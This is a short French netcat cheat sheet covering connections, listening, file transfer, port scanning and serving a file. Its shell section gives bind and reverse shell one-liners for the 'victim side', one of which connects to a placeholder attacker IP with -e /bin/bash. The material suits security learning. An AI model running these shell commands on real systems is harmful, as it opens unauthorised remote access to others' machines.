# 🔌 Cheatsheet Netcat (nc)

Netcat (nc) est un outil de diagnostic réseau simple et puissant, utilisé pour créer des connexions TCP/UDP, transférer des fichiers, faire du port knocking ou même ouvrir des shells.

---

## 📡 Connexion et écoute

```bash
nc <IP> <PORT>                 # Connexion TCP simple
nc -u <IP> <PORT>              # Connexion UDP
nc -lvnp <PORT>                 # Écoute TCP (-l : listen, -v : verbose, -n : no DNS, -p : port)
```

---

## 🐚 Reverse shell & bind shell

```bash
# Bind Shell (côté victime)
nc -lvnp 4444 -e /bin/bash

# Reverse Shell (côté victime)
nc <IP_de_l'attaquant> 4444 -e /bin/bash
```

---

## 📁 Transfert de fichiers

```bash
# Serveur (récepteur)
nc -lvnp 1234 > fichier.txt

# Client (envoyeur)
nc <IP> 1234 < fichier.txt
```

---

## 🔍 Port scanning basique

```bash
nc -zv <IP> 20-100             # Scan de ports avec Netcat
```

---

## 🔧 Divers

```bash
nc -lvnp 80 < index.html       # Mini serveur web (serve un fichier)
```

---

> 🛡️ Outil puissant, mais à manipuler uniquement dans des environnements légitimes ou d'apprentissage.
